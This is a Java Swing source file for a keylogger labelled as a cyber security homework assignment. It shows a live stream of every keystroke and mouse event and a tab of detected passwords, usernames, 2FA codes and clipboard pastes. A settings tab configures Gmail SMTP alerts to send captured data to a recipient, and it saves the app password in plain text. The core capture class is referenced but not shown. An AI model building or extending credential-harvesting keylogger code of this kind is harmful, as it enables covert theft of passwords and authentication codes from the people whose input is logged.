package keylogger;

import com.github.kwhat.jnativehook.NativeHookException;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.text.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.Properties;

/**
 * Swing GUI entry point.
 *
 * Three tabs:
 *   1. All Activity  – live stream of every keystroke and mouse event
 *   2. Credentials   – detected passwords / 2FA codes
 *   3. Settings      – email notification configuration
 */
public class App extends JFrame {

    // ── Colours ───────────────────────────────────────────────────────────────
    private static final Color C_BG      = new Color(0x1e1e2e);
    private static final Color C_SURFACE = new Color(0x313244);
    private static final Color C_FG      = new Color(0xcdd6f4);
    private static final Color C_ACCENT  = new Color(0x89b4fa);
    private static final Color C_GREEN   = new Color(0xa6e3a1);
    private static final Color C_RED     = new Color(0xf38ba8);
    private static final Color C_YELLOW  = new Color(0xf9e2af);

    private static final Font FONT_MONO = new Font("Consolas", Font.PLAIN, 12);
    private static final Font FONT_UI   = new Font("Segoe UI", Font.PLAIN,  13);
    private static final Font FONT_BOLD = new Font("Segoe UI", Font.BOLD,   13);
    private static final Font FONT_HEAD = new Font("Segoe UI", Font.BOLD,   18);

    private static final String CFG_FILE = "email.properties";

    // ── Core ──────────────────────────────────────────────────────────────────
    private final CoreLogger logger;

    // ── Components ────────────────────────────────────────────────────────────
    private JLabel        statusDot;
    private JLabel        statusLabel;
    private JButton       toggleBtn;
    private JTextPane     allPane;
    private JTextPane     passPane;
    private JCheckBox     chkEnabled;
    private JTextField    tfSender;
    private JPasswordField pfAppPass;
    private JTextField    tfRecipient;

    // ── Constructor ───────────────────────────────────────────────────────────

    public App() {
        super("KeyLogger v1.0  —  HW3 Cyber Security");
        setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
        setSize(1000, 660);
        setMinimumSize(new Dimension(720, 480));
        setLocationRelativeTo(null);
        getContentPane().setBackground(C_BG);

        logger = new CoreLogger(
            new CoreLogger.LogCallback() {
                @Override public void call(String text) { appendAllLog(text); }
            },
            new CoreLogger.CredentialCallback() {
                @Override public void call(CredentialEntry entry) { appendCredential(entry); }
            }
        );
        loadEmailConfig();
        buildUI();

        addWindowListener(new WindowAdapter() {
            @Override public void windowClosing(WindowEvent e) { onClose(); }
        });
    }

    // ── Build UI ──────────────────────────────────────────────────────────────

    private void buildUI() {
        setLayout(new BorderLayout());
        add(buildTopBar(),  BorderLayout.NORTH);
        add(buildTabs(),    BorderLayout.CENTER);
        add(buildFooter(),  BorderLayout.SOUTH);
    }

    private JPanel buildTopBar() {
        JPanel left = darkPanel(new FlowLayout(FlowLayout.LEFT, 14, 10));

        JLabel title = new JLabel("KeyLogger");
        title.setFont(FONT_HEAD);
        title.setForeground(C_ACCENT);
        left.add(title);

        statusDot = new JLabel("●");
        statusDot.setFont(new Font("Segoe UI", Font.PLAIN, 22));
        statusDot.setForeground(C_RED);
        left.add(statusDot);

        statusLabel = new JLabel("Stopped");
        statusLabel.setFont(FONT_UI);
        statusLabel.setForeground(C_RED);
        left.add(statusLabel);

        JPanel right = darkPanel(new FlowLayout(FlowLayout.RIGHT, 12, 10));
        toggleBtn = styledButton("▶  Start", C_GREEN, C_BG);
        toggleBtn.addActionListener(new ActionListener() {
            @Override public void actionPerformed(ActionEvent e) { toggleLogging(); }
        });
        right.add(toggleBtn);

        JPanel bar = darkPanel(new BorderLayout());
        bar.add(left,  BorderLayout.WEST);
        bar.add(right, BorderLayout.CENTER);
        return bar;
    }

    private JTabbedPane buildTabs() {
        JTabbedPane tabs = new JTabbedPane();
        tabs.setBackground(C_BG);
        tabs.setForeground(C_FG);
        tabs.setFont(FONT_UI);

        allPane  = buildLogPane();
        passPane = buildLogPane();

        tabs.addTab("  All Activity  ", wrapLog(allPane));
        tabs.addTab("  Credentials  ",  wrapLog(passPane));
        tabs.addTab("  Settings  ",     buildSettingsTab());
        return tabs;
    }

    private JTextPane buildLogPane() {
        JTextPane pane = new JTextPane();
        pane.setEditable(false);
        pane.setBackground(C_SURFACE);
        pane.setForeground(C_FG);
        pane.setFont(FONT_MONO);
        pane.setCaretColor(C_FG);
        pane.setBorder(new EmptyBorder(6, 8, 6, 8));
        return pane;
    }

    private JPanel wrapLog(final JTextPane pane) {
        JPanel p = darkPanel(new BorderLayout(0, 4));
        p.setBorder(new EmptyBorder(6, 8, 4, 8));

        JScrollPane scroll = new JScrollPane(pane);
        scroll.setBorder(BorderFactory.createLineBorder(C_SURFACE.brighter()));
        p.add(scroll, BorderLayout.CENTER);

        JPanel btnRow = darkPanel(new FlowLayout(FlowLayout.RIGHT, 0, 2));
        JButton clearBtn = styledButton("Clear display", C_SURFACE, C_FG);
        clearBtn.addActionListener(new ActionListener() {
            @Override public void actionPerformed(ActionEvent e) { clearPane(pane); }
        });
        btnRow.add(clearBtn);
        p.add(btnRow, BorderLayout.SOUTH);
        return p;
    }

    private JPanel buildSettingsTab() {
        JPanel p = darkPanel(new GridBagLayout());
        p.setBorder(new EmptyBorder(20, 30, 20, 30));
        GridBagConstraints c = new GridBagConstraints();
        c.insets  = new Insets(6, 4, 6, 4);
        c.anchor  = GridBagConstraints.WEST;
        c.fill    = GridBagConstraints.NONE;

        // Section title
        JLabel title = new JLabel("Email Notification Settings");
        title.setFont(new Font("Segoe UI", Font.BOLD, 15));
        title.setForeground(C_ACCENT);
        c.gridx = 0; c.gridy = 0; c.gridwidth = 2;
        c.insets = new Insets(4, 4, 12, 4);
        p.add(title, c);

        c.gridwidth = 1;
        c.insets = new Insets(6, 4, 6, 4);

        // Row 1 – Enable
        c.gridx = 0; c.gridy = 1; p.add(darkLabel("Enable email alerts"), c);
        chkEnabled = new JCheckBox();
        chkEnabled.setBackground(C_BG);
        c.gridx = 1; p.add(chkEnabled, c);

        // Row 2 – Sender
        c.gridx = 0; c.gridy = 2; p.add(darkLabel("Sender Gmail address"), c);
        tfSender = darkTextField(44);
        c.gridx = 1; c.fill = GridBagConstraints.HORIZONTAL; p.add(tfSender, c);
        c.fill = GridBagConstraints.NONE;

        // Row 3 – App password
        c.gridx = 0; c.gridy = 3; p.add(darkLabel("Gmail App Password"), c);
        pfAppPass = new JPasswordField(44);
        styleTextField(pfAppPass);
        c.gridx = 1; c.fill = GridBagConstraints.HORIZONTAL; p.add(pfAppPass, c);
        c.fill = GridBagConstraints.NONE;

        // Row 4 – Recipient
        c.gridx = 0; c.gridy = 4; p.add(darkLabel("Recipient address"), c);
        tfRecipient = darkTextField(44);
        c.gridx = 1; c.fill = GridBagConstraints.HORIZONTAL; p.add(tfRecipient, c);
        c.fill = GridBagConstraints.NONE;

        // Row 5 – Save button
        JButton saveBtn = styledButton("Save Settings", C_ACCENT, C_BG);
        saveBtn.addActionListener(new ActionListener() {
            @Override public void actionPerformed(ActionEvent e) { saveEmailConfig(); }
        });
        c.gridx = 0; c.gridy = 5; c.gridwidth = 2;
        c.anchor = GridBagConstraints.CENTER;
        c.insets = new Insets(16, 4, 8, 4);
        p.add(saveBtn, c);

        // Row 6 – Hint
        c.gridy = 6; c.anchor = GridBagConstraints.WEST;
        c.insets = new Insets(6, 4, 4, 4);
        JLabel hint = new JLabel(
            "<html><span style='color:#f9e2af'>"
            + "Tip: Use a Gmail <b>App Password</b> (NOT your regular password).<br>"
            + "Enable 2-Step Verification, then create one at:<br>"
            + "myaccount.google.com &rarr; Security &rarr; App Passwords.</span></html>");
        hint.setFont(new Font("Segoe UI", Font.PLAIN, 11));
        p.add(hint, c);

        JPanel wrapper = darkPanel(new BorderLayout());
        wrapper.add(p, BorderLayout.NORTH);
        return wrapper;
    }

    private JPanel buildFooter() {
        JPanel f = darkPanel(new FlowLayout(FlowLayout.LEFT, 14, 4));
        JLabel info = new JLabel("Output: " + CoreLogger.LOG_FILE
                + "  |  " + CoreLogger.PASS_FILE);
        info.setFont(new Font("Segoe UI", Font.PLAIN, 11));
        info.setForeground(C_SURFACE.brighter());
        f.add(info);
        return f;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private JPanel darkPanel(LayoutManager layout) {
        JPanel panel = (layout != null) ? new JPanel(layout) : new JPanel();
        panel.setBackground(C_BG);
        return panel;
    }

    private JLabel darkLabel(String text) {
        JLabel l = new JLabel(text);
        l.setForeground(C_FG);
        l.setFont(FONT_UI);
        return l;
    }

    private JTextField darkTextField(int cols) {
        JTextField tf = new JTextField(cols);
        styleTextField(tf);
        return tf;
    }

    private void styleTextField(JTextField tf) {
        tf.setBackground(C_SURFACE);
        tf.setForeground(C_FG);
        tf.setCaretColor(C_FG);
        tf.setFont(FONT_MONO);
        tf.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(C_ACCENT.darker()),
                new EmptyBorder(4, 6, 4, 6)));
    }

    private JButton styledButton(String text, Color bg, Color fg) {
        JButton btn = new JButton(text);
        btn.setBackground(bg);
        btn.setForeground(fg);
        btn.setFont(FONT_BOLD);
        btn.setBorderPainted(false);
        btn.setFocusPainted(false);
        btn.setOpaque(true);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        btn.setBorder(new EmptyBorder(7, 18, 7, 18));
        return btn;
    }

    // ── Toggle logging ────────────────────────────────────────────────────────

    private void toggleLogging() {
        if (logger.isRunning()) {
            logger.stop();
            toggleBtn.setText("▶  Start");
            toggleBtn.setBackground(C_GREEN);
            statusDot.setForeground(C_RED);
            statusLabel.setForeground(C_RED);
            statusLabel.setText("Stopped");
        } else {
            try {
                logger.start();
                toggleBtn.setText("■  Stop");
                toggleBtn.setBackground(C_RED);
                statusDot.setForeground(C_GREEN);
                statusLabel.setForeground(C_GREEN);
                statusLabel.setText("Running");
            } catch (NativeHookException ex) {
                JOptionPane.showMessageDialog(this,
                        "Failed to register native hook:\n" + ex.getMessage(),
                        "Error", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    // ── Log appending ─────────────────────────────────────────────────────────

    private void appendAllLog(final String text) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override public void run() { appendToPane(allPane, text, C_FG); }
        });
    }

    private void appendCredential(final CredentialEntry entry) {
        final StringBuilder sb = new StringBuilder();
        sb.append("\n").append(repeat('-', 44)).append("\n");
        sb.append("[").append(entry.getTimestamp()).append("]  ")
          .append(entry.getType()).append("\n");
        sb.append("Window   : ").append(entry.getWindow()).append("\n");
        if (entry.getUsername() != null && !entry.getUsername().trim().isEmpty())
            sb.append("Username : ").append(entry.getUsername()).append("\n");
        sb.append("Password : ").append(entry.getPassword()).append("\n");

        final Color color;
        if ("2FA_CODE".equals(entry.getType()))         color = C_YELLOW;
        else if ("CLIPBOARD_PASTE".equals(entry.getType())) color = C_ACCENT;
        else                                             color = C_GREEN;

        SwingUtilities.invokeLater(new Runnable() {
            @Override public void run() { appendToPane(passPane, sb.toString(), color); }
        });
    }

    private void appendToPane(JTextPane pane, String text, Color color) {
        StyledDocument doc = pane.getStyledDocument();
        Style style = pane.addStyle("s", null);
        StyleConstants.setForeground(style, color);
        StyleConstants.setFontFamily(style, "Consolas");
        StyleConstants.setFontSize(style, 12);
        try {
            doc.insertString(doc.getLength(), text, style);
            pane.setCaretPosition(doc.getLength());
        } catch (BadLocationException ignored) {}
    }

    private void clearPane(JTextPane pane) { pane.setText(""); }

    // ── Email config ──────────────────────────────────────────────────────────

    private void saveEmailConfig() {
        Properties props = new Properties();
        props.setProperty("enabled",     String.valueOf(chkEnabled.isSelected()));
        props.setProperty("sender",      tfSender.getText().trim());
        props.setProperty("appPassword", new String(pfAppPass.getPassword()));
        props.setProperty("recipient",   tfRecipient.getText().trim());
        props.setProperty("smtpServer",  "smtp.gmail.com");
        props.setProperty("smtpPort",    "587");

        try {
            FileOutputStream fos = new FileOutputStream(CFG_FILE);
            props.store(fos, "KeyLogger email settings");
            fos.close();
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(this, "Could not save: " + ex.getMessage(),
                    "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        logger.emailConfig = new EmailConfig(
                chkEnabled.isSelected(),
                props.getProperty("sender"),
                props.getProperty("appPassword"),
                props.getProperty("recipient"),
                props.getProperty("smtpServer"),
                Integer.parseInt(props.getProperty("smtpPort"))
        );
        JOptionPane.showMessageDialog(this, "Settings saved.", "Saved",
                JOptionPane.INFORMATION_MESSAGE);
    }

    private void loadEmailConfig() {
        File cfgFile = new File(CFG_FILE);
        if (!cfgFile.exists()) return;

        Properties props = new Properties();
        try {
            FileInputStream fis = new FileInputStream(cfgFile);
            props.load(fis);
            fis.close();
        } catch (IOException ignored) { return; }

        boolean enabled = Boolean.parseBoolean(props.getProperty("enabled", "false"));
        logger.emailConfig = new EmailConfig(
                enabled,
                props.getProperty("sender",      ""),
                props.getProperty("appPassword", ""),
                props.getProperty("recipient",   ""),
                props.getProperty("smtpServer",  "smtp.gmail.com"),
                Integer.parseInt(props.getProperty("smtpPort", "587"))
        );

        final boolean finalEnabled = enabled;
        final String  sender  = props.getProperty("sender",      "");
        final String  appPass = props.getProperty("appPassword", "");
        final String  recip   = props.getProperty("recipient",   "");

        SwingUtilities.invokeLater(new Runnable() {
            @Override public void run() {
                if (chkEnabled  != null) chkEnabled.setSelected(finalEnabled);
                if (tfSender    != null) tfSender.setText(sender);
                if (pfAppPass   != null) pfAppPass.setText(appPass);
                if (tfRecipient != null) tfRecipient.setText(recip);
            }
        });
    }

    private static String repeat(char c, int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) sb.append(c);
        return sb.toString();
    }

    // ── Shutdown ──────────────────────────────────────────────────────────────

    private void onClose() {
        logger.shutdown();
        dispose();
        System.exit(0);
    }

    // ── Entry point ───────────────────────────────────────────────────────────

    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception ignored) {}

        SwingUtilities.invokeLater(new Runnable() {
            @Override public void run() { new App().setVisible(true); }
        });
    }
}
